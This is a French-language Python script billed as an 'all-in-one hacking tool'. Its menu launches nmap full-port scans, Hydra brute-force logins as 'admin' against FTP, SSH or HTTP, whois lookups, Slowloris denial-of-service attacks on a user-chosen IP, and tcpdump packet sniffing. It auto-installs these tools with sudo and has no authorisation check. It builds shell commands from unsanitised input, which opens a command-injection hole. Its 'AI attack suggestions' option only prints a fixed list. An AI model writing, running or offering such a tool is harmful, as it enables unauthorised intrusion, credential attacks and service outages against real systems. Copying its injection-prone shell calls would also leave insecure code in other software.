import os
import subprocess
import sys

# Fonction pour vérifier l'installation d'un outil
def check_and_install(tool, install_command):
    try:
        subprocess.run([tool, '--version'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(f"{tool} est déjà installé.")
    except FileNotFoundError:
        print(f"{tool} n'est pas installé. Installation en cours...")
        install_tool(install_command)

# Fonction pour installer un outil
def install_tool(command):
    try:
        subprocess.run(command, shell=True)
        print("L'installation est terminée.")
    except Exception as e:
        print(f"Erreur lors de l'installation : {e}")

# Fonction pour scanner une IP avec nmap
def nmap_scan(target):
    print(f"Scan en cours sur {target}...")
    os.system(f"nmap -p 1-65535 {target}")

# Fonction brute-force avec hydra
def hydra_bruteforce(target, service, wordlist):
    print(f"Lancement de l'attaque brute-force sur {target} ({service})...")
    os.system(f"hydra -l admin -P {wordlist} {target} {service}")

# Fonction OSINT avec whois
def whois_info(domain):
    print(f"Récupération des informations WHOIS pour {domain}...")
    os.system(f"whois {domain}")

# Fonction pour DDoS avec slowloris
def ddos_attack(target):
    print(f"Lancement d'une attaque DDoS éducative sur {target} avec Slowloris...")
    os.system(f"slowloris {target}")

# Fonction pour sniffer les paquets avec tcpdump
def sniff_packets(interface):
    print(f"Sniffing des paquets sur l'interface {interface}...")
    os.system(f"tcpdump -i {interface} -c 10")

# Fonction IA pour suggérer des attaques
def ai_attack_suggestions():
    print("\nSuggestions d'attaques basées sur IA :")
    print("- Scanner les ports de la cible (nmap)")
    print("- Effectuer une attaque brute-force sur FTP ou SSH (hydra)")
    print("- Récupérer les informations WHOIS d'un domaine")
    print("- Lancer une attaque DDoS éducative avec Slowloris")
    print("- Sniffer les paquets sur un réseau (tcpdump)")

# Menu principal
def main():
    print("Bienvenue dans l'outil de hacking tout-en-1\n")
    
    # Vérification et installation des outils
    check_and_install('nmap', 'sudo apt install nmap')
    check_and_install('hydra', 'sudo apt install hydra')
    check_and_install('whois', 'sudo apt install whois')
    check_and_install('slowloris', 'sudo apt install slowloris')
    check_and_install('tcpdump', 'sudo apt install tcpdump')

    # Menu des options
    print("\nChoisissez une option:")
    print("1. Scanner les failles avec Nmap")
    print("2. Effectuer une attaque Brute-Force avec Hydra")
    print("3. Récupérer des informations WHOIS sur un domaine")
    print("4. Lancer une attaque DDoS éducative avec Slowloris")
    print("5. Sniffer des paquets avec Tcpdump")
    print("6. Suggestions d'attaques basées sur IA")
    print("7. Quitter")

    choice = input("Entrez le numéro de l'option choisie : ")

    if choice == '1':
        target = input("Entrez l'adresse IP cible pour le scan : ")
        nmap_scan(target)
    elif choice == '2':
        target = input("Entrez l'adresse IP de la cible : ")
        service = input("Entrez le service (ex: ftp, ssh, http) : ")
        wordlist = input("Entrez le chemin vers le fichier wordlist : ")
        hydra_bruteforce(target, service, wordlist)
    elif choice == '3':
        domain = input("Entrez le domaine pour WHOIS : ")
        whois_info(domain)
    elif choice == '4':
        target = input("Entrez l'adresse IP de la cible pour l'attaque DDoS : ")
        ddos_attack(target)
    elif choice == '5':
        interface = input("Entrez l'interface réseau (ex: eth0, wlan0) : ")
        sniff_packets(interface)
    elif choice == '6':
        ai_attack_suggestions()
    elif choice == '7':
        print("Au revoir!")
        sys.exit()
    else:
        print("Choix invalide. Essayez à nouveau.")

if __name__ == "__main__":
    main()

